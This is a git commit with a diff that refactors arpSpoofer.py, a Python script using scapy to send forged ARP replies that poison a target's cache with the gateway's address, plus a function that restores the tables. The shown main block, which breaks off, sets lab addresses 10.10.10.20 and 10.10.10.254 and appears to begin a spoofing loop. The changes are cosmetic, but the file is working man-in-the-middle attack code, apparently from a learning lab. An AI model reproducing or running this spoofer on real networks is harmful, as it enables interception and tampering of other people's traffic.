058a8d71bb3eb348d2b3f20c1e8992e6ed954c0e
Mikorollo2608 <michal.p2608@wp.pl>
2024-05-05 10:35:50 -0400

    More refactoring ARP

--- arpSpoofer.py
+++ arpSpoofer.py
@@ -13,27 +13,28 @@ def get_mac(ip):
             answered_list = scapy.srp(arp_request_broadcast, timeout=5, verbose=False)[0]
             mac = answered_list[0][1].hwsrc
         except:
-            print("No mac")
+            print("Mac not found")
         finally:
             return mac
 
 
 def spoof(t_ip, spoof_ip):
     packet = ARP(op="is-at", pdst=t_ip, hwdst=get_mac(t_ip), psrc=spoof_ip)
-    scapy.send(packet, verbose=True)
+    scapy.send(packet, verbose=False)
 
 
-def restore(destination_ip, source_ip):
-    destination_mac = get_mac(destination_ip)
-    source_mac = get_mac(source_ip)
-    packet = ARP(op="is-at", pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
-    scapy.send(packet, verbose=True)
+def restore(dst_ip, src_ip):
+    destination_mac = get_mac(dst_ip)
+    source_mac = get_mac(src_ip)
+    packet = ARP(op="is-at", pdst=dst_ip, hwdst=destination_mac, psrc=src_ip, hwsrc=source_mac)
+    scapy.send(packet, verbose=False)
 
-
-target_ip = "10.10.10.20"
-gateway_ip = "10.10.10.254"
 
 if __name__ == '__main__':
+
+    target_ip = "10.10.10.20"
+    gateway_ip = "10.10.10.254"
+
     try:
         counter = 0
         while True:
